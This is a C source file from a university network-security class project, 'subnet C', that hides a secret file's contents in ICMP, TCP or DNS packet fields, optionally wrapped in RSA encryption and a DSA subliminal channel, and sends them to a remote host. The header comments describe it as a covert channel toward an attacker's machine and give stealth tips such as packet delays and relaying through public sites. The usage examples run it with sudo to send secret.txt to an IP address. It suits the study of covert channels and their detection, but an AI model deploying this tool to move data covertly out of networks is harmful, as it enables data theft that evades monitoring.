// ------------------------------------------------------------------------------------------------ 
/*  Purdue CS528 - Network Security - Spring 2016
**  Final Project: Subliminal Network Channels
**  Kyriakos Ispoglou (ispo)
**              _                          _______ 
**             | |                  _     (_______)
**    ___ _   _| |__  ____  _____ _| |_    _       
**   /___) | | |  _ \|  _ \| ___ (_   _)  | |      
**  |___ | |_| | |_) ) | | | ____| | |_   | |_____ 
**  (___/|____/|____/|_| |_|_____)  \__)   \______)
**
**  subnet C - Version 1.0  
**
**
**  main.c
**
**  This is the main file that uses all the auxiliary files to implement the subliminal channels.
**  First the secret is read from a file. Then, we can encrypt it using RSA (if we set the --rsa 
**  argument). Then, we can use subliminal channels to further hide the secret (by setting the 
**  --dsa argument). Because the subliminal message is stored in r parameter of DSA and not on s
**  parameter, we can ignore s and reduce data size by 1/2. In that case we won't be able to 
**  verify the signature though. Finally we use one of the covert channels to send the protected
**  secret. On the receiver's side we repeat the same steps in reverse order.
**
**  The security of our message is based on 2 things: The private key of RSA, and the secret
**  primes of the subliminal channel. If someone knows exactly the algorithm used to send data
**  he cannot find the secret unless he has the private key and the secret primes. For now we
**  assume that these are hardcoded in the binary. If we want to achieve forward secrecy we should
**  update them periodically.
**  
**  WARNING: The biggest problem here are NATs. When at least one end is behind a NAT many
**      packet fields may change (including these that we use for covert channels). Once such
**      example is port numbers. When NAT is used (--nat option) we can avoid using the port
**      numbers for our covert channel. 
**      Some NATs may also change TCP sequence numbers to make them more secure. In that case 
**      the TCP covert channel doesn't work.
**
**  NOTE: Covert channels have the problem that destination IP (of the attacker) is exposed. I'm
**      not going to fix that. What I'm trying to do is to make covert channels stealthier. If you
**      want to protect destination IP then you need other methods, like sending encrypted data to 
**      a global server that everyone can access (e.g. twitter, facebook) and then access them from
**      attacker's machine and decrypt them locally. Thus attacker's IP will be hidden.
**  
**  NOTE 2: Root privileges are required in both sides (to use raw sockets and to sniff the 
**      interface).
**
**  NOTE 3: Server and client must operate exactly in the same way (server should know exactly what
**      to expect from client).
**
**
**   * * * ---===== Usage examples =====--- * * *
**
**      * HINT: Add a delay between packets to avoid packet loses and to increase stealthiness.
**
**      * Operate as a client. Server is located at 192.168.1.101. Use ICMP covert channel at 
**        request mode. Use DSA and have a delay 250ms between packets. Debug level is 2. Secret
**        is stored on secret.txt
**
**          sudo ./subnetc -c -A 192.168.1.100 --dsa --icmp --request -D 250 -d 2 secret.txt 
**
**
**      * Operate as a server. Client is located at 192.168.1.101. Sniff at interface wlan0 for 200
**        seconds and expect to see data in TCP covert channel at response mode. Use RSA both and DSA.
**         Debug level is 1. Store secret at secret_rcv.txt
**
**          sudo ./subnetc -s -A 192.168.1.100 -i wlan0 -w200 --rsa --dsa --tcp --response \
**              -D 250 -d 1 secret_rcv.txt 
**
**
**   * * * ---===== TODO list =====--- * * *
**
**      [1]. There's no packet loss/corruption recovery. If 1 packet get lost, it can
**           destroy the whole ciphertext/signature and thus the secret. There are many
**           ways to handle that (redundancy, ACKs, NACKs, etc.)
**
**      [2]. Secret is encrypted block by block using RSA OAEP in ECB mode. Change it
**           CBC, or smth similar
**  
**      [3]. Add options for setting destination port when NAT is used
*/
// ------------------------------------------------------------------------------------------------ 
#include "subnetc.h"                                    // all includes are here


// ------------------------------------------------------------------------------------------------ 
const  char *argp_program_version     = "subnet-C v1.0";
const  char *argp_program_bug_address = "ispo@purdue.edu";
static char doc[]                     = 
    "subnet C - Subliminal Network Channels"
    "\v"
    "This program is written for class project. Extra effort should be needed to make "
    "it ready to work in real scenarios";
 
static char args_doc[]                = "[FILENAME]";
static struct argp_option options[]   = 
{ 
    { 0,0,0,0, "Program operation:" },
    { "server", 's', 0, 0, "Operate as a server (receiver)"},
    { "client", 'c', 0, 0, "Operate as a client (sender)"  },

    { 0,0,0,0, "Subliminal channel options:" },
    { "dsa",       '\x81', 0,      0, "Use DSA subliminal channel"              },
    { "rsa",       '\x82', 0,      0, "Encrypt secret using RSA"                },
    { "bandwidth", 'B',    "BITS", 0, "Bandwidth of subliminal channel in bits" },
    { "verify",    '\x83', 0,      0, "Verify the signature (use both (r,s))"   },

    { 0,0,0,0, "Covert channel selection:" },
    { "icmp", '\x91', 0, 0, "ICMP ECHO covert channel"},
    { "tcp",  '\x92', 0, 0, "TCP covert channel"      },
    { "dns",  '\x93', 0, 0, "DNS covert channel"      },

    { 0,0,0,0, "Channel mode:" },
    { "request",  'q', 0, 0, "Send 'request' packets" },
    { "response", 'r', 0, 0, "Send 'response' packets"},
    { "nat",      'n', 0, 0, "NAT is used; Do not use source ports as channels" },

    { 0,0,0,0, "Other options:" },
    { "addr",  'A', "IP_ADDR",   0, "IP address of send/receive data"                   },
    { "if",    'i', "INTERFACE", 0, "Interface to sniff from (S)"                       },
    { "delay", 'D', "MILLISEC",  0, "Delay between packets being sent (C)" },
    { "wait",  'w', "SECONDS",   0, "How many seconds to wait before stop sniffing (S)" },  
    { "debug", 'd', "LEVEL",     0, "Set the debug level 1-3"                           },

    { 0 } 
};

struct arguments 
{
    char    *filename;                                  // file to load/store secret

    byte    server, client,                             // server/client operation
            dsa, rsa, verify,                           // protection layers
            icmp, tcp, dns,                             // covert channel to use
            request, response;                          // packet types

    int     nat,                                        // NAT is used?
            delay,                                      // delay between packets being sent
            wait,                                       // sniffing timeout
            bandwidth;                                  // bandwidth of subliminal channel

    char    *ip_addr;                                   // remote host
    char    *iface;                                     // interface to sniff
};

byte recvbuf[ RECV_BUF_SZ ];                            // store received data here
int  rbidx;                                             // index
int  dbg_level = 0;                                     // how much to print

// ------------------------------------------------------------------------------------------------
/*
**  accumulate(): This is a callback function, which is called by receive(). Once receive()
**      extracts the bits from the covert channels, it calls this function to accumulate them
**      with the existing ones.
**
**  Arguments: buf (byte*)  : buffer with the new bits
**             len (int)    : buffer length
**
**  Return Value: None.
*/
void accumulate( byte *buf, int len )
{
    int k;                                              // iterator

    memcpy( &recvbuf[rbidx], buf, len );                // append bits to the buffer
    rbidx += len;                                       // update limit index

    //prnt_buf( DBG_LVL_2, "[+] Got secret bits: ", buf, len, 1 );
    prnt_buf( DBG_LVL_2, "", buf, len, 1 );
}

// ------------------------------------------------------------------------------------------------
/*
**  parse_opt(): Callback function of argp_parse().
**
**  Arguments: key (int)          : short option set
**             arg (char*)        : argument value
**             state (argp_state) : internal state of argp
**
**  Return Value: 0 on success, an error code on failure.
*/
static error_t parse_opt( int key, char *arg, struct argp_state *state ) 
{
    struct arguments *arguments = state->input;
 

    switch( key )                                       // parse argument
    {
        case 's'   : arguments->server    = 1;   break;
        case 'c'   : arguments->client    = 1;   break;     
        case '\x81': arguments->dsa       = 1;   break;
        case '\x82': arguments->rsa       = 1;   break;
        case '\x83': arguments->verify    = 1;   break;
        case 'B'   : arguments->bandwidth = atoi(arg); break;
        case '\x91': arguments->icmp      = 1;   break;
        case '\x92': arguments->tcp       = 1;   break;
        case '\x93': arguments->dns       = 1;   break;
        case 'q'   : arguments->request   = 1;   break;
        case 'r'   : arguments->response  = 1;   break;
        case 'n'   : arguments->nat       = COVERT_NAT; break;
        case 'A'   : arguments->ip_addr   = arg; break;
        case 'i'   : arguments->iface     = arg; break;
        case 'D'   : arguments->delay     = atoi(arg); break;       
        case 'w'   : arguments->wait      = atoi(arg); break;       
        case 'd'   : dbg_level            = atoi(arg); break;
        
        case ARGP_KEY_NO_ARGS: argp_usage (state);
        case ARGP_KEY_ARG    : arguments->filename = arg; return 0;
        default              : return ARGP_ERR_UNKNOWN;
    }   

    return 0;
}

// ------------------------------------------------------------------------------------------------
/*
**  main(): Our main function.
**
**  Return Value: 0 on success, -1 on failure.
*/
int main( int argc, char *argv[] )
{
    static struct argp argp = { options, parse_opt, args_doc, doc, 0 };
    struct arguments arguments;
    int op = 0;
    int method = 0;
    int i, j, k;

    byte* buf, *buf_e;
    uint len;
    int chan_sz;


    /* ------------------------------------------------------------------------ 
     * process arguments
     * ------------------------------------------------------------------------ */
    arguments.filename  = NULL;                         // set default values
    arguments.ip_addr   = NULL;
    arguments.iface     = "eth0";                       // default interface
    arguments.server    = 0;                            // no default operation
    arguments.client    = 0;
    arguments.dsa       = 0;                            // no default subliminal channel
    arguments.rsa       = 0;
    arguments.verify    = 0;                            // do not verify (ignore 's')
    arguments.bandwidth = 10;                           // default BW =10 bits
    arguments.icmp      = 0;                            // no default covert channel
    arguments.tcp       = 0;
    arguments.dns       = 0;
    arguments.request   = 0;
    arguments.response  = 0;
    arguments.nat       = 0;                            // no NAT is used
    arguments.wait      = 32;                           // default timeout
    arguments.delay     = 10;                           // 10ms delay


    argp_parse( &argp, argc, argv, 0, 0, &arguments );  // parse command line arguments


    /* check if arguments are mutually exclusive */
    if( arguments.server + arguments.client != 1 ) {
        printf( "[-] Error! --server and --client are required and mutually exclusive.\n" );
        return -1;
    }

    if( arguments.icmp + arguments.tcp + arguments.dns != 1 ) {
        printf( "[-] Error! --icmp, --tcp and --dns are required and mutually exclusive.\n" );
        return -1;
    }
    
    if( arguments.request + arguments.response != 1 ) {
        printf( "[-] Error! --request and --response are required and mutually exclusive.\n" );
        return -1;
    }
    
    /* check if arguments have valid values */
    if( arguments.bandwidth < 1 || arguments.bandwidth > 16 ) {
        printf( "[-] Error! --bandwidth range is between 1 and 16 bits.\n" );
        return -1;
    }

    if( arguments.wait < 0 ||  arguments.delay < 0 ) {
        printf( "[-] Error! --wait and --delay cannot be negative.\n" );
        return -1;
    }

    /* check if required arguments are all set */
    if( !arguments.ip_addr ) {
        printf( "[-] Error! --addr is required.\n" );
        return -1;
    }

    /* process further the arguments */     
    op      = arguments.client  ? OP_CLIENT   : OP_SERVER;
    method  = arguments.request ? COVERT_REQ  : COVERT_RESP;    
    method |= arguments.icmp    ? COVERT_ICMP :
              arguments.tcp     ? COVERT_TCP  :
                                  COVERT_DNS;
    method |= arguments.nat;

    chan_sz = 16 + (arguments.tcp ? (arguments.nat ? 0 : 14) + 32 : 0) 
                 + (arguments.dns ? (arguments.nat ? 0 : 14) + 16 : 0);


    /* start actuall program. Print welcome message */
    printf( "+--------------------------------------------------+\n"
            "|      PURDUE Univ. CS528 - Network Security       |\n"
            "|    Final Project: Subliminal Network Channels    |\n"
            "|                                            -ispo |\n"
            "+--------------------------------------------------+\n\n" );


    /* ------------------------------------------------------------------------ 
     * operate as a server ?
     * ------------------------------------------------------------------------ */
    if( op == OP_SERVER )                               
    {
        /* receive secret from client through covert channel */
        if( receive(arguments.iface, arguments.ip_addr, arguments.wait, method) < 0 )
            return -1;

        /* at this point we hope that recvbuf contains the whole secret */
        prnt_dbg( DBG_LVL_2, "[+] Returning from receive()...\n");

        if( !(buf = shrink(recvbuf, &rbidx)) )          // shrink buffer
            return -1;
        
        len = rbidx;

        prnt_buf( DBG_LVL_2, "[+] Final buffer: ", buf, rbidx, 0 );


        /* ciphertext is always 128 bytes (numbers are prepended with 0s) */
        if( arguments.rsa )                             // RSA used?
        {
            byte    *cbuf;                              // temp buffer
            int     clen = 0;                           //   and its size

            if( !(cbuf = rsadecr(buf, rbidx, &clen)) )  // decrypt
                return -1;                              // failure

            free( buf );                                // we don't need this anymore

            buf   = cbuf;                               // replace buffers          
            rbidx = clen;                               //   and lengths
            cbuf  = NULL;                               // no UAF
        }


        /* extract subliminal message */
        if( arguments.dsa )                             // DSA used?
        {           
            byte    *sig, *secret, *buf_s;              // buffers
            int     slen, sig_sz;                       //   and lengths


            sig_sz = arguments.verify ? DSA_SIGN_SZ : DSA_SIGN_PARAM_SZ;

            if( !(buf_s = calloc( arguments.bandwidth * rbidx/sig_sz + HEAP_PADD, 1 )) )
                return -1;


            for( j=0, slen=0; j<rbidx; j+=sig_sz, slen+=arguments.bandwidth )
            {
                if( !(secret = dsasubl_ext(&buf[j], arguments.bandwidth, !arguments.verify)) )
                    return -1;                          // failure
        
                memcpy(&buf_s[slen], secret, arguments.bandwidth );

                free( secret );                         // we don't need it anymore
            }


            prnt_buf( DBG_LVL_2, "[+] Secret Extracted: ", buf_s, slen, 1 );

            free( buf );

            if( !(buf = shrink(buf_s, &slen)) )         // expand buffer again
                return -1;
            
            free( buf_s );
            buf_s = NULL;                               // no UAF
            rbidx = slen;
        }


        if( rbidx > 0 )                                 // non empty buffer?
        {
            prnt_buf( DBG_LVL_2, "[+] Final buffer: ", buf, rbidx, 0 );

            if( store_secret(arguments.filename, buf, rbidx) < 0 )
                return -1;

            /* print it to stdout also (may contain non ASCII characters */
            prnt_dbg( DBG_LVL_1, "\n----- BEGIN SECRET -----\n");
            for( k=0; k<rbidx; k++ ) prnt_dbg( DBG_LVL_1, "%c", buf[k] );
            prnt_dbg( DBG_LVL_1, "----- END SECRET -----\n");
        }
        else 
            prnt_dbg( DBG_LVL_1, "[+] Buffer is empty!\n" );

        prnt_dbg( DBG_LVL_0, "[+] Program finished.\n" );

        return 0;                                       // success!
    }
    

    /* ------------------------------------------------------------------------ 
     * else, operate as a client
     * ------------------------------------------------------------------------ */
    if( !(buf = load_secret(arguments.filename, &len)) )
        return -1;


    /* ------------------------------------------------------------------------ 
     * add encryption (if needed)
     * ------------------------------------------------------------------------ */
    if( arguments.rsa )                                 // use RSA?
    {
        byte    *cbuf;                                  // temp buffer
        int     clen = 0;                               //   and its size

        if( !(cbuf = rsaencr(buf, len, &clen)) )        // encrypt
            return -1;                                  // failure

        free( buf );                                    // we don't need this anymore

        buf   = cbuf;                                   // replace buffers
        len   = clen;                                   //   and lengths        
        cbuf  = NULL;                                   // no UAF

        prnt_dbg( DBG_LVL_2, "[+] Buffer (%d) : ", len );   
        prnt_buf( DBG_LVL_2, "", buf, len, 0 ); 
    }

    if( !(buf_e = expand(buf, &len)) )                  // expand buffer
        return -1;


    /* ------------------------------------------------------------------------ 
     * add subliminal channel (if needed)
     * ------------------------------------------------------------------------ */
    if( arguments.dsa )                                 // use DSA?
    {
        byte    *sig, *buf_s;                           // buffers
        int     slen, sig_sz;                           //   and lengths

        
        sig_sz = arguments.verify ? DSA_SIGN_SZ : DSA_SIGN_PARAM_SZ;

        if( !(buf_s = calloc(sig_sz*len/arguments.bandwidth + HEAP_PADD, 1 )) )
            return -1;


        /* if we do not verify, half of the buffer is used */
        for( j=0, slen=0; j<len; j+=arguments.bandwidth, slen+=sig_sz )
        {
            if( !(sig = dsasubl_ins(&buf_e[j], arguments.bandwidth, !arguments.verify)) ) 
                return -1;                              // failure
        
            memcpy( &buf_s[slen], sig, sig_sz );

            free( sig );                                // we don't need it anymore
        }


        prnt_buf( DBG_LVL_0, "[+] SIGNATURE: ", buf_s, slen, 0 );

        free( buf_e );

        if( !(buf_e = expand(buf_s, &slen)) )           // expand buffer again
            return -1;      

        free( buf_s );
        buf_s = NULL;
        len = slen;
    }

    prnt_dbg( DBG_LVL_2, "[+] Starting transmission...\n" );

    /* ------------------------------------------------------------------------ 
     * send buffer through the covert channels (one small piece at a time)
     * ------------------------------------------------------------------------ */
    for( i=0; i<len; i+=chan_sz ) 
    {
        if(transmit( &buf_e[i], chan_sz, arguments.ip_addr, method, 0 ) < 0) {
            printf( "[-] Error! Cannot transmit packet.\n" );
            return -1;
        }


        /* we need a delay to make channel stealthier and avoid packet loses */
        usleep(1000*arguments.delay);
    }


    prnt_dbg( DBG_LVL_0, "[+] Program finished.\n" );

    return 0;                                           // success!
}
// ------------------------------------------------------------------------------------------------
